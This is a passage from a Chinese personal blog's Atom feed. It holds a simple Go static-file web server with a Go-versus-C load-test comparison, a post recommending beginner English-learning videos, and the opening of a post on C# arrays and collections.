class=&quot;line&quot;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;122&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;package&lt;/span&gt; main&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;flag&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;fmt&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;io/ioutil&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;log&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;net/http&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;os&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;os/exec&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;path/filepath&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;strings&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; realPath &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;//当前程序运行目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;www路由，请求处理 w:response  r:request&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;staticResource&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(w http.ResponseWriter, r *http.Request)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fmt.Println(&lt;span class=&quot;string&quot;&gt;&quot;url:&quot;&lt;/span&gt; + r.RequestURI)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; r.Method == &lt;span class=&quot;string&quot;&gt;&quot;get&quot;&lt;/span&gt; || r.Method == &lt;span class=&quot;string&quot;&gt;&quot;GET&quot;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		disposeGet(w, r)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; r.Method == &lt;span class=&quot;string&quot;&gt;&quot;post&quot;&lt;/span&gt; || r.Method == &lt;span class=&quot;string&quot;&gt;&quot;POST&quot;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		disposePost(w, r)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.WriteHeader(&lt;span class=&quot;number&quot;&gt;501&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.Write([]&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;HTML&amp;gt;&amp;lt;HEAD&amp;gt;&amp;lt;TITLE&amp;gt;Method Not Implemented&amp;lt;/TITLE&amp;gt;&amp;lt;/HEAD&amp;gt;&amp;lt;BODY&amp;gt;&amp;lt;P&amp;gt;HTTP request method not supported.&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;取字串 s:字符串 l:取到多少位&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;substr&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(s &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;, l &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;)&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;string&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(s) &amp;lt;= l &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; s&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ss, sl, rl, rs := &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, []&lt;span class=&quot;keyword&quot;&gt;rune&lt;/span&gt;(s)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; _, r := &lt;span class=&quot;keyword&quot;&gt;range&lt;/span&gt; rs &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		rint := &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;(r)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; rint &amp;lt; &lt;span class=&quot;number&quot;&gt;128&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			rl = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			rl = &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; sl+rl &amp;gt; l &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		sl += rl&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		ss += &lt;span class=&quot;keyword&quot;&gt;string&lt;/span&gt;(r)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; ss&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;get获取静态资源 w: response r: request&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;disposeGet&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(w http.ResponseWriter, r *http.Request)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	request_type := r.URL.Path[strings.LastIndex(r.URL.Path, &lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;):]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;switch&lt;/span&gt; request_type &amp;#123; &lt;span class=&quot;comment&quot;&gt;//文件类型判断&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;.html&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.Header().Set(&lt;span class=&quot;string&quot;&gt;&quot;content-type&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;text/html&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;.htm&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.Header().Set(&lt;span class=&quot;string&quot;&gt;&quot;content-type&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;text/html&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;.css&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.Header().Set(&lt;span class=&quot;string&quot;&gt;&quot;content-type&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;text/css&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;.js&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.Header().Set(&lt;span class=&quot;string&quot;&gt;&quot;content-type&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;.png&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.Header().Set(&lt;span class=&quot;string&quot;&gt;&quot;content-type&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;image/png&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;.gif&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.Header().Set(&lt;span class=&quot;string&quot;&gt;&quot;content-type&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;image/gif&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;.jpg&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		w.Header().Set(&lt;span class=&quot;string&quot;&gt;&quot;content-type&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;image/jpeg&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fin, err := os.Open(realPath + r.URL.Path)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;defer&lt;/span&gt; fin.Close()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;literal&quot;&gt;nil&lt;/span&gt; &amp;#123; &lt;span class=&quot;comment&quot;&gt;//未找到静态资源文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; request_type == &lt;span class=&quot;string&quot;&gt;&quot;.html&quot;&lt;/span&gt; || request_type == &lt;span class=&quot;string&quot;&gt;&quot;.htm&quot;&lt;/span&gt; &amp;#123; &lt;span class=&quot;comment&quot;&gt;//未找到html文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			w.WriteHeader(&lt;span class=&quot;number&quot;&gt;404&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			fmt.Println(&lt;span class=&quot;string&quot;&gt;&quot;static resource:&quot;&lt;/span&gt;, err)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			w.Write([]&lt;span class=&quot;keyword&quot;&gt;byte&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;HTML&amp;gt;&amp;lt;TITLE&amp;gt;Not Found&amp;lt;/TITLE&amp;gt;&amp;lt;BODY&amp;gt;&amp;lt;P&amp;gt;The server could not fulfill.your request be.is unavailable or nonexistent.&amp;lt;/BODY&amp;gt;&amp;lt;/HTML&amp;gt;&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fd, _ := ioutil.ReadAll(fin)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	w.Write(fd)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;post上传静态资源 w: response r: request&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;disposePost&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(w http.ResponseWriter, r *http.Request)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//未实现&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;程序入口&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//获取程序当前路径&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	file, _ := exec.LookPath(os.Args[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	path, _ := filepath.Abs(file)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//命令行参数处理&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	arg_num := &lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(os.Args)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; arg_num == &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		port := os.Args[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] &lt;span class=&quot;comment&quot;&gt;//第一个参数为端口号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		fmt.Println(&lt;span class=&quot;string&quot;&gt;&quot;http server start port:&quot;&lt;/span&gt; + port)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;//取前当前目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		realPath = substr(path, strings.LastIndex(path, &lt;span class=&quot;string&quot;&gt;&quot;\\&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		flag.Parse()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;comment&quot;&gt;//请求处理&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		http.HandleFunc(&lt;span class=&quot;string&quot;&gt;&quot;/www/&quot;&lt;/span&gt;, staticResource)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		err := http.ListenAndServe(&lt;span class=&quot;string&quot;&gt;&quot;:&quot;&lt;/span&gt;+port, &lt;span class=&quot;literal&quot;&gt;nil&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;literal&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			log.Fatal(&lt;span class=&quot;string&quot;&gt;&quot;服务器出错:&quot;&lt;/span&gt;, err)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		fmt.Println(&lt;span class=&quot;string&quot;&gt;&quot;参数错误，程序退出&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;周末有人介绍golang很合适后端开发，随即把之前C实现的静态资源下载功能(读取服务器上的静态资源文件内容返回给客户端)改成golang实现。然后对比一下效果。&lt;/p&gt;
&lt;h2 id=&quot;实现对比&quot;&gt;&lt;a href=&quot;#实现对比&quot; class=&quot;headerlink&quot; title=&quot;实现对比&quot;&gt;&lt;/a&gt;实现对比&lt;/h2&gt;&lt;p&gt;同样使用标准库,golang实现代码+注释只需要123行,C实现代码+注释412行，golang代码量只有C的1/3。&lt;/p&gt;
&lt;h2 id=&quot;测试对比&quot;&gt;&lt;a href=&quot;#测试对比&quot; class=&quot;headerlink&quot; title=&quot;测试对比&quot;&gt;&lt;/a&gt;测试对比&lt;/h2&gt;&lt;p&gt;我使用的是jmeter测试，首先测试c实现的服务,分别用100,200,300线程并发，每线程访问10。测试数据如下:&lt;br&gt;&lt;img src=&quot;/img/go-1.png&quot; alt=&quot;c&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/go-2.png&quot; alt=&quot;c&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/go-3.png&quot; alt=&quot;c&quot;&gt;&lt;br&gt;C版实现越测数据越看不下去了，出错率越来越大。接着我测golang实现，我分别用300线程，1000线程和5000线程并发，每线程访问10次。测试数据如下:&lt;br&gt;&lt;img src=&quot;/img/go-4.png&quot; alt=&quot;c&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/go-5.png&quot; alt=&quot;c&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/go-6.png&quot; alt=&quot;c&quot;&gt;&lt;br&gt;除了响应时间延长，其它都比较稳定，出错率全为0.难道这是传说中的后端神器，难道老板再也不用担心网站访问人数太多当机了，难道我也转golang开发。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>英语入门视频推荐</title>
    <link href="http://binyanbin.github.io/2016/05/06/english-1/"/>
    <id>http://binyanbin.github.io/2016/05/06/english-1/</id>
    <published>2016-05-05T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;坚持学习英语也有一年多时间，除了在线外教学习，还看一些原版英语课程和英语电视剧，下面我分享2个非常非常非常合适初学者的系列视频’Learn English with Jennifer’和’extro English’。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Learn-English-with-Jennifer&quot;&gt;&lt;a href=&quot;#Learn-English-with-Jennifer&quot; class=&quot;headerlink&quot; title=&quot;Learn English with Jennifer&quot;&gt;&lt;/a&gt;Learn English with Jennifer&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/english-1.png&quot; alt=&quot;Learn English with Jennifer&quot;&gt;&lt;br&gt;一个美国英语教师教授一个俄罗斯人英语的教学视频，只有英文字幕，不用看字幕也很容易看懂听懂，非常合适初学者，作为入门视频课程非常合适。&lt;br&gt;&lt;a href=&quot;http://video.1speaking.com/view/index335.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;观看地址&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;extro-English&quot;&gt;&lt;a href=&quot;#extro-English&quot; class=&quot;headerlink&quot; title=&quot;extro English&quot;&gt;&lt;/a&gt;extro English&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/english-2.jpg&quot; alt=&quot;extro English&quot;&gt;&lt;br&gt;这是一个搞笑情景剧,描述几个年轻人浪漫而搞笑的生活故事,可以让你从头笑到尾,只有英文字幕,超级易懂,适合初级或中级能力的学习,对于提高口语和听力具有很好的帮助。&lt;br&gt;&lt;a href=&quot;http://video.1speaking.com/view/index418.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;观看地址&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;坚持学习英语也有一年多时间，除了在线外教学习，还看一些原版英语课程和英语电视剧，下面我分享2个非常非常非常合适初学者的系列视频’Learn English with Jennifer’和’extro English’。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>C#由内存模型说性能2 数组与集合</title>
    <link href="http://binyanbin.github.io/2016/05/02/CSharp-2/"/>
    <id>http://binyanbin.github.io/2016/05/02/CSharp-2/</id>
    <published>2016-05-01T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;由于.net不会实时回收内存，那么.net对数组与集合是内存的是怎么处理的&lt;/p&gt;
&lt;h2 id=&quot;数组与集合&quot;&gt;&lt;a href=&quot;#数组与集合&quot; class=&quot;headerlink&quot; title=&quot;数组与集合&quot;&gt;&lt;/a&gt;数组与集合&lt;/h2&gt;&lt;p&gt;大家都知道数组必须指定大小，而且大小一但指定就不能更改了，也就是说数组不能动态的增加容量，那么对于一些需要动态增加容量的需求是实现不了的。实现动态扩容的需求都是通过集合,如List,Dictionary,ArrayList.&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
